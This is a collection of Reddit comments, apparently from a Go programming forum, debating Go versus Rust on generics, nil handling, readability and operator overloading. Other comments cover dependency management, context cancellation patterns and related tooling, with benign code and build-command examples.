&gt; If your trying to use a nil-pointer, it means that you have a programming error and your program should crash. This is precisely the purpose of `expect` and `unwrap` though. They are only used in areas where failure should never occur, and if it does, a crash with a detailed error message should be provided.
Why not just use https://golang.org/pkg/runtime/#Version ?
Command Line User Interface (Console UI inspired by TurboVision) https://github.com/VladimirMarkelov/clui 
fortunately, we're closing in on the dependency management problem :)
Interfaces, slices, maps, and func values can all be nil. Fixing pointers to structs is just a tiny part of the problem. That being said, having worked on a 500k LOC codebase for 3.5 years... nil pointer panics were almost never a problem. 
A switch might be more efficient, because the compiler can optimize it into a binary search. func IsLambda(ch rune) bool { switch ch { case '\\', 'Λ', 'λ', 'ᴧ', 'Ⲗ', 'ⲗ', '𝚲', '𝛌', '𝛬', '𝜆', '𝜦', '𝝀', '𝝠', '𝝺', '𝞚', '𝞴': return true } return false }
That's an unfortunate name, because it clashes with the [iris webframework](https://github.com/kataras/iris) which is mostly known for its author embedding other opensource projects without crediting them.
&gt; Null-safety is cool, but at the same time it prevents library\project devs from thinking about default state. No it doesn't, Rust has both [Default](https://doc.rust-lang.org/std/default/trait.Default.html) and [uninitialized](https://doc.rust-lang.org/std/mem/fn.uninitialized.html) values (the latter is unsafe for obvious reasons). It's weird that you dedicate a paragraph to tell people they should distinguish null and nil and yet mix them up yourself a little later. Null-safety in Rust has nothing to do whatsoever with uninitialized or default values. 
I don't think Rob would ever waste his time to make such a comment. In fact he has replied with few but very helpful responses on this subreddit.
Yes, slowly but surely things are getting better. But I really expected Go to be the more mature language, considering it is older, has a larger community and broader adoption. It will still take a while before `dep` becomes usable because it strips out the vendor directory, making it incompatible with godep and glide. Heck, I've seen projects modify code in `vendor` (because too lazy to fork I guess), the whole situation is just a mess.
------------------------------------------------------------------------------------- In Rust you can write a function with a signature that looks like this: pub fn map&lt;A, B, F&gt;(callback: F, xs: &amp;[A]) -&gt; Vec&lt;B&gt; where F: for&lt;'a&gt; Fn(&amp;'a A) -&gt; B ------------------------------------------------------------------------------------- This is precisely what Go's trying to avoid. This signature. It's unreadable.
risking going off topic here, but... &gt; because it strips out the vendor directory, making it incompatible with godep and glide I don't see how vendor pruning - which, to be clear, is necessary for correctness - makes dep incompatible with godep and glide _specifically_. Either you're referring to some property of those two systems that I'm not aware of, or it would be incompatible with _anything_ that populates `vendor`. If you're saying the latter, then note that adding that support wouldn't be terribly hard (https://github.com/golang/dep/issues/186), but doing so could also unintentionally fracture the ecosystem more: https://github.com/golang/dep/issues/222#issuecomment-277243870 &gt; Heck, I've seen projects modify code in vendor (because too lazy to fork I guess) Unconditionally stripping out vendor directories, and generally treating them as volatile/disposable, is the best way to disincentivize that behavior.
If you want to write more functional Go, I am working on a compile-to-Go language (more like a set of syntax extensions) that allows you to write things like `xs.filter(even).fold(sum)` and have it "just work." Check it out: https://github.com/lukechampine/ply
I didn't mean literally unreadable, of course it's readable but it takes time to read. In go, pretty much every function signature can be described as "takes this and returns that", where this and that are some types. The advantage of Go here is that the context is always simple. Of course, you can't type-enforce everything, but due to the language's simplicity, it's quite easy for a programmer to write correct code that is not type-enforced.
I don't understand the fetch_document_future() example, is that missing some code or is there some magic Rust thing going on?
My understanding is that dep ignores a sub-dependency glide.lock or Godep.json and checks out the latest commit instead, is that not correct? &gt; Unconditionally stripping out vendor directories, and generally treating them as volatile/disposable, is the best way to disincentivize that behavior. Agreed, but the transition will still be painful; that was the main point I was trying to make.
&gt; I didn't mean literally unreadable, of course it's readable but it takes time to read. Maybe if you aren't familiar to the concept of generics and the Rust function syntax, but for someone that has learned Rust, it takes zero time to read and understand. The keywords clearly display the intent of each parameter. The `&lt;&gt;` after the function name is for declaring and optionally describing the generic type placeholders that will be used in the function declaration that follows. The `()` that follows this lists the parameters that are required by the function, same as any other language. The type that follows the `-&gt;` is the return type of the function. The optional `where` clause that follows on the next line is used to describe the generic types that were previously mentioned. Ensures correct API usage at compile time and access to methods specified by the traits listed for each generic parameter &gt; In Go, pretty much every function signature can be described as "takes this and returns that", where this and that are some types, and therefore has no syntax for describing generics and generic functions like what is benig described. The Go alternative is writing the same method for each type, manually. That's no different here. The bulk of your function signatures in Rust will look something like this: fn parse(input: &amp;str) -&gt; Result&lt;Statement, StatementError&gt; The difference is just that Rust supports generics which makes our lives easier via vast code re-usability for downstream developers, and Go does not.
Not at all. You didn't mention that the function also takes a borrowed slice (borrowed is very important) and also puts several constrains on the function that it takes (lifetimes). Well, this specific function does not impose as much constrains, but you have to look to see if it really does not.
Also quite a lot of them are in code examples and documentation (which is also used as tests), where the brevity is wanted and the value is guaranteed to be `Some()`. So there is still no production example of wrong error handling with `unwrap()` here, and I understand that this is something OP argued is typical in Rust code.
You're kind of just nitpicking here. All slices are borrowed in Rust. All references are borrowed.
Yes - for the empty map - there is in case your map is mutated and can become logically empty at some point. It still holds the pointer to the allocated chunks, but at this moment it doesn't contain any data. The benefit of it is that you don't need to allocate memory (well, until you reach the map capacity) when map will be reused. The biggest examples of this is good old cache. The nil map is useful when you don't have anything to pass when method or function or object is expecting a map. There is really nothing special about this approach, and can be easily done in any language. The difference is that was done in core, so I can expect all maps to behave like that. 
Perhaps this helps, either to cheat or to use: https://github.com/google/mtail
Missing code -- just a function declared elsewhere being used as the input parameter for the map method. Each value in the iterator will be 'mapped' to that function so the yielded results will be the results of each iteration through that function.
We do that too, using runtime like you suggest. But we also override a `Version` variable to the semver of the app/service we are building using ldflags so in healthchecks and help screens we can see both the app version and the version of go used to compile. 
I have no trouble reading it. I also have no trouble writing C. But I usually prefer Python or Go, because they're easier to work with. My point is just that Go is so simple to read, that unwritten requirements (enforced by compiler in other languages) are very easy to follow.
I'm going to have to say the opposite. Writing and reading Rust is by far much easier than Python/Go for me.
nil map is unset, empty map is set but has no values. It's like a nil slice versus empty slice. One indicates "I don't know, nobody told me" and one indicates "someone explicitly said there are no values".
Also shows the facility of len() and range working on nil maps / slices. They do the right thing regardless of empty or nil, rather than blowing up, because it's clear what the expected behavior should be. This is one of many ways in which nil in Go is not as dangerous as it is in other languages. 
In some ways; Go is still much slicker at the moment. We'll get there.
&gt; The difference is that was done in core, so I can expect all maps to behave like that. Ok, so, essentially, all maps (and other types types that can be nil) are effectively an Option type... 
We'll be needing a link.
In C# taking a LINQ expression, but then needing to significantly more in that same loop. Had to remove the entire expression and just express in a loop. As a maintainer, I had to re-write code to extend it. It could be I'm bad at such expressions or I'm biased away from complicated expressions, or that C# didn't have exactly what I needed, but other systems would. 
"but for someone that has learned Rust, it takes zero time to read and understand" This is definitely not true in general. I'm reasonably familiar with Rust (I've written maybe 20k lines), and it took me several seconds to parse this signature. I doubt that I'm particularly unusual in this. 
Close, with a few differences. &gt; Okay, so we're defining a function called map and then B and F are it's arguments? `B` and `F` are generic placeholders, if you will. They will be used to describe parameters that follow (or parameters within another generic parameter). &gt; Okay no these are arguments and self is probably like python's self which means F is a type and f something passed in of type F and this is a function on an object These are the parameters, and self is what you know from Python. This keyword only applies to methods. You can read it as `self: Self` where `Self` is a generic placeholder (like B/F) that is the type of the type calling the method. The `Self` placeholder is automatically inferred for methods. It's doubly important to see how self is called in Rust because of the borrowing and ownership rules. `self` means to consume the original value so it will no longer exist after the method call, `&amp;self` means to borrow the value immutably, and `&amp;mut self` means to mutably borrow. &gt; And this returns a Map which I guess is a builtin mapping Self to F which are probably types given we used &lt;&gt; for types before. Is Self the type of self? Indeed. There are multiple types in Rust that implement the `Iterator` trait, so if you roll out the type of an iterator chain it can be long, like `Fold&lt;Map&lt;Etc.&gt;&gt;&gt;`. When a call to `next` is performed, the original value will go through all these chains to lazily yield the final result. `Map&lt;Self, F&gt;` here is telling us that it's just wrapping the original iterator into a new iterator and storing that closure associated with the `Map` type. &gt; Wait no, Self is a builtin type Sized. Why did we put this on this line? This is defining that `Self` implements the `Sized` trait. Generics works on traits rather than types. No limit on how many traits you define -- but the more you define, the less types that will qualify. When you define a trait, you can use that traits methods in the body. &gt; Self is only used once, why didn't we just put Sized up there? You can't describe generic types in the return type. &gt; And F is a type which is a function that accepts Self except we just defined Self so this is a recursive definition fine, and there is something about Self which is also an Item? And Item is builtin? and F returns B which is why we had B all the way at the beginning okay. You have now noticed that it is a nested type. Not every day that you will see one of these. `Item` is an associated type defined by the type implementing the `Iterator` trait. It designates the type that comes out of each iteration, which can be a different type that the input. The `Item` for `StatementSplitter` could be a `&amp;str` and the `Item` for `Map` could be a `Statement`. A simple example is the Ion shell that I am working on. Lots of types that implement the Iterator trait and return values based on an inner `&amp;str` being parsed one token at a time. I have a `StatementSplitter` that takes a `&amp;str` and splits it into multiple `&amp;str` for each statement, so Item is specified as `&amp;str` because the `next()` method returns a `Option&lt;Self::Item&gt;`. [Easier to understand when you are reading the API documentation for the trait in question](https://doc.rust-lang.org/nightly/core/iter/trait.Iterator.html#associatedtype.Item). Associated types will ultimately be used in Rust to support HKTs in the future. &gt; Conclusion: map is a function on an object which takes a function that operates on Sized Items? And it returns a hashmap of Sized objects to said functions. Rather than a hashmap, it's a nested type containing the functions for each step in the `Iterator` chain. The compiler will reduce this down to highly optimized assembly so you won't pay for the abstractions. You can pass unsized types through the chain of iterators though. It's just the closures/iterator structures that are sized (known at compile time). &gt; In Go, the most complex function definition would be variadic and include channel direction operators and return multiple things, but would still just be This is basically because Go does not support generics. You're free to write Rust without generics, but as Go does not support it, it doesn't have syntax for it. If Go did get generics, it would likely look the same as Rust.
Have a code sample to share? Rust features an Iterator trait which comes with all the functional methods for free to any type that implements the `Iterator` trait, which means implementing just the `next()` method. When you construct your iterators, you end up with code like: // Define an iterator from the given input let iterator = StatementSplitter::new(input) // If the statement is invalid, print an error and skip to the next .filter_map(check_statement); Which you can use in a loop like so: // Yield all successful values from the iterator until none remain for statement in iterator { }
It isn't, terribly. [here](https://gist.github.com/prohulaelk/204ebe69d65093064a7e2d13a70f7967) is a gist of a simple tail I wrote for use at my job a while ago. Not terribly fantastic code looking back on it (why did I roll my own linked list...?), but it's less than 200 LOC, only uses the standard library packages, and has worked flawlessly for what I needed it to do for the last couple years.
(Please note that I wasn't disagreeing with you, just encouraging you to argue the actual point, instead of taking the "easy" route. :) )
&gt; In go, pretty much every function signature can be described as "takes this and returns that" I think this is backwards. When I read `doSomething(foo interface{}) interface{}` I know I now have to read a bunch of English to know what it can take, what can be nil, etc. I sigh, read the English comments about the contract that the language couldn't express, and pray it never changes.
LINQ is crazy expressive. I've always been able to just add another "where", "include", etc, to modify an existing expression to meet new requirements.
I've made comments about my opinion on Go vs. Rust before, so I'll avoid anything here, but I do want to make a possible suggestion. I've seen a lot of complaints about zero values in Go, and I was wondering what people's opinion would be on the ability to set default values on a per-type basis. For example, you could do `type Example int = 3`, and then `var e Example` would have a value of `3`. ^(Of course, this syntax breaks the type aliases that they're working on, but that's not the point.) A possible addition would be a new unary operator, maybe `?`, that could detect zero values and return a boolean. For example: if ?e { fmt.Println("e == 3") } I haven't given this much thought, but I was wondering what problems this could introduce, and what people who don't like zero values would think of it.
Serverless and why AWS went wrong have nothing to do with each-other. AWS went down because a human ran a command where it wasn't supposed to, which caused a major problem. The cloud, with all it's failures, is still more reliable than a classic datacenter and still better suited to quickly prototype / become global than a traditional: we'll build a datacenter wherever we want to go in approach. Serverless means running function "sized" workloads in the cloud directly, without setting up a full server to do so. It can be super useful for a few really well thought cases where you wouldn't want to spin up an entire instance, the whole day, to wait for a request that may or may not come. Same goes if you need to run a cron job in a cloud environment (having to synchronize that across active / backup instances would be too much effort for something that is simple). Nothing operates slower because something is serverless. And nobody that really cares about their workloads puts all their eggs in one basket. You can choose to run your servers in Europe in a few locations, or you can go for Europe and Asia or Europe and US or US and Asia and so on, a lot of combinations only from AWS, and if you add GCP or Azure in the mix, then it really doesn't make sense to scare people away by saying serverless is bad. No, it's not, nor is the cloud. Just like any other tool you use, they need to be understood and applied correctly.
In Rust, that would be: &gt; cargo install &gt; program But the topic is about cross-compilation, which is different. Rust features an extensive toolchain/dev manager. &gt; rustup target add x86_64-pc-windows-gnu &gt; cargo build --release --target x86_64-pc-windows-gnu Now you have a Windows binary on Linux box. Then if a new release of Rust comes out, you can &gt; rustup update And all your components/toolchains/targets will be updated. You can also install multiple versions side by side and switch to them. &gt; rustup default nightly &gt; rustup default stable &gt; rustup default beta &gt; rustup default 1.14.0 &gt; rustup default 1.15.0 &gt; etc
Idk if you realized or not but that's a bot just FYI :)
How would you implement fmt.Print without reflection? Printing arbitrary structs is invaluable. And how would you implement XML/JSON unmarshaling?
https://github.com/sbsends/ajwt FTFY
Genuine question. I don't understand how multiple return types and reflection are related in Go. 
Types should be able to be determined at compile-time, not runtime. Same for XML/JSON, this can be done at compile time. Rust does this.
Very interesting. This simplifies a number of packages in the standard library. It would surely make go even more accessible for newcomers, both experienced developers adopting go and people learning go as their first language.
+1 ....dealing with Big ints is painful
Not really older. Go and Rust are around for about same time. 
Hmm - this is interesting concept, but I'm not convinced that we should replace default int type with arbitrary precision one. To be honest, I'm not sold on the idea at all - it can be solved using generics and operator overloading or it can be a new type in built-ins. It's only a proposal tho. 
That seems like an extreme example that illustrates a lot of other complexities not really related to generics. And you have to compare a generic signature to what is currently being offered by Go: func Slice(slice interface{}, less func(i, j int) bool) If we simply go with types, we have no idea what the first argument is supposed to be at all. We could pass anything, but we might be surprised by a sudden unexpected panic attack. I would argue that a theoretical signature like so would make things a lot more readable: func &lt;T&gt; Slice(slice []T, less func(i, j int) bool) Or func Slice(slice []T, less func(i, j int) bool) where T Or func Slice(slice []T, less func(i, j int) bool) where T is interface{}
tail -f doesn't do anything special for file rotation except maybe by not choking on file truncates.
sure, i'll try to clarify &gt; I can only imagine situations where I need to provide additional cancelation methods Yes, this is the only real use case I actually have that I'm trying to satisfy. Having the other semantics line up was kinda just a side effect that fell out. &gt; implying the SourceManager has a context.Context as a field. But that doesn't appear to be the case, and in any case the context documentation states Yes, currently, it does not - I'm working on it [here](https://github.com/sdboyer/gps/pull/196). The long-lived context is held (yes, in a struct) on a new sub-object, the [`callManager`](https://github.com/sdboyer/gps/blob/5f372bd9165993ea56912cdfed6870f83363425d/deducers.go#L22-L30). &gt; and in that situation any of these is completely sufficient: Yes, one could construct a solution from the existing functions that's equivalent to what constext does. That shouldn't be a surprise - constext isn't fundamentally adding (almost) anything, it's just codifying and standardizing a pattern. But it's also not adding any costs that don't exist with the direct implementation you suggest. So, if instead of having that `callManager.ctx` and using `Cons()` we follow your suggestion to use a plain subcontext: ``` subctx, cancel := context.WithCancel(ctx) ``` then we have to change some things around. The long-lived object still needs to be able to cancel any individual call that's made, but now has to do so via that `cancel`. Replacing the `callManager.ctx` would be a `callManager.quitchan` (just `chan struct{}`). With those changes, you could achieve the same effect - [pseudocode](https://gist.github.com/sdboyer/501ed8398dbb15a8c9f779012e71389e). So, again, it's not anything new - just a formalization of a particular pattern. If I could figure out a way to force GC to collect the constext, then it would be strictly better, albeit only slightly, because there'd be no need to cancel the constext (the equivalent being closing the `quitchan` in the above pseudocode).
Haha, yep. It seemed like a distinct enough pattern that it was at least worth tossing together a library to experiment with its ergonomics. I was also considering `coalext`, as in "coalesce contexts", but `constext` was just too good/awful to pass up for a first stab :)
&gt; There are many comments alluding to Go being scripting toy language or Rust is just too good for such insignificant project. You should report those to the moderators; both of those things are against the Rust subreddit's rules.
kardianos' example is what I was thinking of. So, for example, say you're traversing a list of users to return those users with an email addresses at gmail.com. Now later on you add a service that will retrieve a user's email address if it doesn't exist in your list. so, in the beginning you have something like (psuedocode) gmailUsers := map(users, |u| =&gt; u.Email.FromDomain("gmail.com")) but now you want to add in "if the user's email is empty, try to retrieve it from an external source", something like if u.Email == "" { u.Email = tryFetchEmail(u) } this is trivial to add to a loop, but I'm not aware of how to do it with declarative, and do it in a single pass through the list. Basically, any time you would want to add arbitrary logic to the "loop" that is behind all the mapping code. Like logging errors for users that don't have phone numbers, or whatever.
Very simple, I will show you how this would look in Rust (I am assuming you are wanting to mutably update the list in the event that it is missing). Also, what you are describing isn't a map but a filter_map. Using `iter_mut()` will create a mutable iterator from a `Vec` which is assumed that you have mutable access to. The type passed into the `filter_map()` method is a `&amp;mut User`. I am assuming that the user email field is an `Option&lt;String&gt;`, given that it can be empty. let gmail_users = users.iter_mut().filter_map(|user| { if user.email.is_none() { // Passes the &amp;mut User to update the value if it can fetch_email_for(user); } match user.email { Some(email) if email.domain == "gmail.com" =&gt; Some(email) _ =&gt; None } }); for email in gmail_users { println!("{}", email); } Note that `gmail_users` above does not perform any heap allocations. It does not pull values until it is called to in the for loop.
Nobody does "full functional", but many big mainstream languages (notably Java and Javascript) have added functional aspects. It's just a matter of pragmatism.
The problem with the anonymous structs is that its incompatible with the way that multiple values are returned from functions today in go. And it really hurts when you try to compose the return of a function anywhere, e.g. sending the result of: func foo() int64, error {} vals &lt;- foo() If you wanted to use the anonymous struct approach you can't write them as the return type of your function anyway, e.g. `func foo() struct{*Value, error) {}`. Even if you could, existing functions return multiple values anonymously through multiple returns so they aren't compatible. 
I feel like this is exactly the sort of thing the parent comment was talking about.
Currently building one on top of Postgres. Check out Row Security which was release in 9.5. 
Like some people already mentioned in this thread, Rust and Go have different philosophies. I'd like to elaborate on some thoughts as well. Rust values providing choices like Perl and C++ — "there's more than one way to do it". As opposed to Go and Python, which prefer the opposite: "there should be one — and preferably only one — obvious way to do it." For Rust, repetitions and boilerplate code are taken as *first-class* problems. On the other hand, Go has the proverb "a little copying is better than a little dependency". As a result, Rust tends to optimize for the ability to create abstractions in the design-over-abstraction phase. Go's relatively preferred engineering approach, in contrast, is prototyping fast and failing early, focusing more on the speed of iterations and the costs of continuing maintenance, debugging and refactoring. Also, Rust is more or less language-centric. Which means it puts more responsibilities on the language and PLT plays a dominant role in its core. Go designers see programming languages just as a component in the entire development life-cycle and doesn't expect that much that all aspects of doing software need to be carried out by features provided by a programming language. They would rather have a simple language easier to be consumed by external tools and let those tools be composable into the development pipelines. Go looks boring and not innovative if we limit the scope solely in language. But it's quite unique and arguably innovative if we see the software engineering process as a whole, considering that many programming language are copying each other and converging to a more and more similar mindset. 
Yeah. We use Postgres. We set up separate schemas for each customer. Each customer has their own unique global "domain" identifier that doubles as their schema name. All the SQL queries are fully prefixed with the schema.
You can try implementing it using this https://github.com/fsnotify/fsnotify
Damn; you picked out the `reflect` library as a example for `interface{} everywhere` ?
I d'like to see more rust in the container industry...
OK, I got it. So, IMO and all that, but this is almost certainly a design error :) Contexts don't belong in structs, because contexts are designed to live exclusively in (and control the lifecycle of) active callstacks. Putting a context in a struct is actually semantically meaningless: data can't be canceled. This is why I had a record-scratch moment when I saw your repo for the first time. A thread of execution should never have the opportunity to encounter two contexts. It should be given a context at some point in its callchain, and from that point forward use it, amend it for other callstack branches, etc. I understand the thrust of what you want, sort of termination semantics for everything created underneath a parent entity. I had a similar situation in OK Log, I needed a [registry for active streaming queries](https://github.com/oklog/oklog/blob/aafa879d99ff16cf1d7b6b0e164bea139f080296/pkg/store/query_registry.go#L13). Clients [register a query using the context their HTTP request surfed in on](https://github.com/oklog/oklog/blob/aafa879d99ff16cf1d7b6b0e164bea139f080296/pkg/store/api.go#L382), which can be canceled when they terminate the request; inside the registry, we [amend the context with a cancel func](https://github.com/oklog/oklog/blob/aafa879d99ff16cf1d7b6b0e164bea139f080296/pkg/store/query_registry.go#L46-L50) to support teardown when we [stop the registry](https://github.com/oklog/oklog/blob/aafa879d99ff16cf1d7b6b0e164bea139f080296/pkg/store/query_registry.go#L82-L87) itself. In order for this to work there needs to be [a single managerial goroutine](https://github.com/oklog/oklog/blob/aafa879d99ff16cf1d7b6b0e164bea139f080296/pkg/store/query_registry.go#L57-L69) that detects context cancelation and shuts down the output stream; I reckon you'd need something analogous to terminate your work output, whatever it may be.
I was actually going to proof read this before putting it on reddit, but oh well thanks for posting it for me! 
`+` and `*` are operators that are defined in the language. They can be used such that `int + int` and `int * int` both evaluate to `int`. An expression of the type `sql.DB + os.File` doesn't really make sense and will cause a compilation error. Some languages give you ways to *overload* an operator, by defining new behavior for it so that an expression of that form will compile and do some particular thing. (I can't imagine what the behavior would be, but you could do it if you wanted to). User defined operators mean that any existing operators are off limits. You can't monkey with them. But you can define brand new operators from scratch. For instance, Go has no exponentiation operator. You could define `**` as the exponentiation operator, so that `2 ** 3` evaluates to `8`.
Very good point! I should have been more specific 
No problem! It seems quite common to abbreviate "RESTful Web API" as just "API". It's just that once in a while my brain stumbles on this and automatically substitutes "library API" (esp. before I had my morning tea) :)
&gt; No it is not. That's your point: I'm sorry; my argument was a bit unclear. I want that mantra to exist so people don't break compatibility just because they are lazy. If you give realistic expectations (i.e. “be compatible if you can”) people see that as an invitation to only be compatible when it's convenient. By raising the bar to 200% of what is sufficient, people perhaps treat compatibility the way I want to, i.e. be compatible as far as possible, break compatibility only if there's no other way.
I think it's better to keep the operator count contained, and only allow for overloading the + - * / operators. Because otherwise we'll end up with scala'ish DSL's and I don't think we want that in Go.
I've never heard of multi-agents before. I suppose based on your definition, one could implement multi-agents with goroutines.
I like that you did it but I can't refrain myself: why? Why build a front-end framework in go? I built the my-webapp example /head and /banner routes seem to work as expected but design-wise, why bother? Isn't the front-end component-web-framework battle lost to Javascript anyway?
Finally someone that gets it.
&gt; Contexts don't belong in structs, because contexts are designed to live exclusively in (and control the lifecycle of) active callstacks. In what specific sense are they _designed_ to do this? Is that a mechanical statement - e.g., do you mean the manner in which they hold references to other contexts in the tree they form, such that they are subject to GC at an appropriate time as determined by call stack scopes? Or is this a looser statement about authorial intent - that that was the purpose for which they were conceived, and this usage lies outside those bounds? Having just been through the internals of the context package, and I'm not sure how strong the case is for the former. The latter is...well, I'll return to that. &gt; I had a similar situation in OK Log, I needed a registry for active streaming queries. Yes, looking through the links, this requirement looks almost exactly the same as mine. ...almost. There's just one difference, but it's crucial: your use case does not require that a context continue down-stack with the call. For all the references to the `Register` func that SourecGraph can find ([just the one outside tests](https://sourcegraph.com/github.com/oklog/oklog@aafa879d99ff16cf1d7b6b0e164bea139f080296/-/blob/pkg/store/api.go#L382:1-383:1)), there aren't really any down-stack calls needing a ctx - there's just the [loop over the returned channel, writing bytes to the response stream](https://github.com/oklog/oklog/blob/aafa879d99ff16cf1d7b6b0e164bea139f080296/pkg/store/api.go#L384-L389). This difference is important because it allows you an abstraction my case does not - the "quitchan" indicating the caller should stop work that combines both "caller-cancel" and "registry-cancel" is _also_ the data channel. Thus, you're able to get away with not having any sidecar concurrency/GC control behavior in the main caller path, which feels nice and terse. But this isn't possible for my case, because I can't hide the context away. Depending on which `SourceManager` method is being called, the condition of the cache, the condition of the disk, etc., the short-lived context will need to provide cancelation semantics to 0..N i/o calls. And, if you can't hide the context away, then I don't think it's possible to hide the need for explicit cancelation in the main callpath, as laid out in my [pseudocode](https://gist.github.com/sdboyer/501ed8398dbb15a8c9f779012e71389e). Also - the other issue is that the outermost quit channel is something that will eventually make its way back out to the caller, in the form of an updated [`NewSourceManager()`](https://github.com/sdboyer/gps/blob/master/source_manager.go#L131) signature. Doing so is a step towards [moving signal handling out of gps](https://github.com/golang/dep/issues/160). Now, that param could be a `&lt;-chan struct`...but there _may_ be good reason to use context values there, too. I'm *really* trepidatious about the semantics there, but it _could_ be used to handle injecting e.g. [credential information](https://github.com/golang/dep/issues/264). &gt; A thread of execution should never have the opportunity to encounter two contexts. This is the really the key - and IMO, it's a distinction without a difference. Your case has two cancelation vectors, as does mine. You've just _chosen_ to not express the outermost vector as a context. I could construct something similar, per my pseudocode, but I elected not to because the approaches are equivalent in the general case, there was no clear ergonomic advantage to your approach, and in the context of the problem I had, this approach felt like a more transparent, honest way of showing what was going on. So, with statements like: &gt; data can't be canceled (Well...first, forgive me a nitpick: of course it can! "Canceling data" is what we're doing when we purge a cache, and a TTL on a cache datum is generally equivalent to a context deadline.) Just because it's a struct doesn't mean it's "data," and just because it's a call stack doesn't mean it's not. USUALLY that's the case, but in recursive function the call stack looks rather more data-like, and in, say, an actor model, struct+goroutine encapsulates more of an execution unit than data. It seems to me we're rehashing longstanding CS/SWE debates about what 1) logical constructs in programs _should_ mean and 2) therefore what organizational techniques are appropriate (depth-first search? recursive! no, iterative!). You want to ascribe certain semantics to the call stack and context's relationship to it, and while I agree that those are good _guidelines_ given Go's constraints, I disagree that the semantics, and therefore rules, are fixed. Each approach has its pros and cons, but as long as they're equivalent for the general problem - which I think I've demonstrated - then we're not talking about "design error" in choosing one over the other. Rather, we're in the grayer territory of looking for distal effects that fall out from the choice.
That is an option. I am going to rework the core so that it's more reliable and can be rewritten in Go.
Monzo serve as a source of inspiration to me, and were heavily influential in my decision to learn Go. The fact that all their communications seem to be liberally sprinkled with emoji only increases their awesomeness IMO.
I see no evidence that the Go creators are ever likely to consider mathematics a first-case use case for the language, and it continues to be my advice to the scientific community not to learn Go as there are many other languages that will suit them much better without having to be "fixed up" as much as Go. They are welcome to ignore me. No sarcasm. But their only real hope of every having a "scientific Go" is to grow a community so large they can afford to fork it themselves and add in all the things science programmers want.
I had to wait until I was actually at a keyboard. One of the distinguishing characteristics of a language is how easily you can look at a single line of code in isolation and tell what it is doing, and how much it will cost to execute. To use an example, let me discuss in an arbitrary language: a += b.Method() - c.Method().X.Y.Z Go has the characteristic right now that you know that will make two method calls (either static or via an interface, which you can statically determine by the types of `b` and `c`), index into whatever c.Method() is returning directly despite the `X.Y.Z` chain because all the structs are static, and then it's going to increment what must be an int of some sort `a` in what's going to be a single instruction. That's two method calls (which, as methods are, may be either a static lookup or an interface resolution), a static deref into a struct, two arithmetic operations, and an assignment. Even not knowing right now what .Method is I can almost tell all the assembler operations that are going to come out of that statement; the only exception is for whether we have to dynamically resolve a Method via an interface lookup. You of course can not tell how long the .Method() calls are going to take, but you account those against those methods, whatever they are. The more complicated you make the language, the harder that becomes. It is very emphatically _not_ a bright shining line, because nowadays not even Assembly code works by literally going down the list of instructions and executing them in the given order, but as it gets more complicated it definitely changes in character. By contrast, consider what that statement could do in a language like Python. You actually know almost _nothing_ about exactly what that will do, or how costly it will be to execute. All of the `.`s could invoke methods. All of those methods can do arbitrary things up to and including re-wiring the way in which methods are looked up on arbitrary _other_ objects. You don't know that any of the elements involved are numbers. You don't know whether `.X.Y.Z` is a physical thing or will involve arbitrary other computations to generate due to them being "properties". This line alone could end up invoking dozens of methods and doing whoknows what. In C++, that may produce arbitrarily complicated assembler code, not to mention instantiate an arbitrary amount of template code. (If you want to understand why I'm not a fan of C++, sit down one week and write down all the things you must understand about C++ to ensure that you are _sure_ that you understand exactly what that line I wrote above is doing. I budgeted you a "week" for a reason. I'm not sure even a C++ compiler writer could finish that in a day.) Again, let me emphasize, two ends of a continuum, not a binary distinction, because that's easy to forget. Now, the problem with operator overloading is that it is generally worse than useless, _except_ for math code. In normal system code, it A: makes it harder to guess what the code is doing because you also have to resolve the operators, which is often harder than it looks because implementors of operator overloading rapidly discover you have to be able to overload it from either side or even have full dynamic dispatch B: has an extremely well-known history of tempting people into creating "cutesy" APIs that aren't any more clear with the operator overloading than they would be with conventional method calls C: said APIs often suffer from unexpected interactions with the order of operations due to the fact that the people writing cutesy APIs usually want to pick operators based on how they look, rather than where they are in the precedence table D: even if you're not into "category theory" people still generally carry a lot of subconscious category-theory-esque baggage into the operators and expect them to have the same mathematical properties as the original operators which they often don't. And then there's a lot of other minor issues too. The costs tend to greatly exceed the benefits, especially since the costs are real, and most of what people claim as benefits are often actually costs too. Let me call out in a separate paragraph that BY FAR the most important issue here to my mind is its track record of failure to produce nice APIs in the system space. That is the reality we are faced with. Theory is tasked with explaining that reality, not explaining away that reality. It _is_ nice to use in the mathematical space, though, for several reasons: A: The issues with understanding cost are dominated by the fact that you need to understand the costs anyhow, since these are math operations. You already have to know that `A * B` may very well require dozens of machines several hours to complete, "you must be this tall" to program at that level anyhow. B: You generally get to keep the properties of the operators because `+` really is just an elaborated `+`. C: It really does simplify the API to use these mathematical operators because the method-call version of `(a + b) * c * (d + e + (f / g))` is just terrible. However, note it still isn't paradise even in this context, as operators can still lose their properties; for instance, `A * B` != `B * A` in the matrix world (one can be valid while the other isn't). But in this case, the costs can be smaller than the benefits. You can also very rapidly run out of operators, and have issues with mixed operators vs. method calls. But, still, you can get through it. (And now we have Unicode and all the operators you can stand to type...) Allowing the _addition_ of operators, or the use of one-character function names, without them being _overloadable_ is fundamentally different, and is simply a way of calling functions. It may move you slightly down the complexity line, but in a language like Haskell, even if you don't know what `a &lt;$&gt; b` is, you still know that `&lt;$&gt;` is a single function call or instance resolution, the same as any other function call, and the new operators can be fit into the precedence table deliberately because they don't come with hard-coded precedences.
this article (and the previous one too) is just a pure gold high quality super interesting stuff i want to read, thanks
&gt; I don't really like this, personally, since you're now half in imperative land and half in declarative, which is kind of confusing IMO. Agreed; I would write the above more like let gmail_users = users.iter_mut().map(|user| { if user.email.is_none() { fetch_email_for(user); } user }) .filter(|user| user.email.is_some()) .filter(|user| user.email.domain == "gmail.com"); }); I feel like that `map` could be simplified as well, but it's my first cup of coffee :) EDIT: Actually it could, because the assumption here is that `fetch_email_for` is a free function. I'd write it as a method. You'd imagine that it'd look something like this: fn fetch_email(&amp;mut self) { if self.email.is_none() { // update email } } then this looks like let gmail_users = users.iter_mut() .map(|user| { user.fetch_email(); user }) .filter(|user| user.email.is_some()) .filter(|user| user.email.unwrap().domain == "gmail.com"); }); much, much nicer in general. I might try to combine the two filters, actually... (The free function isn't the issue here actually, it's is signature. If you could change that, you could make this easier too.)
Well, it's against our rules for a reason, we don't want that kind of sentiment in our reddit. You'd be doing us a favor.
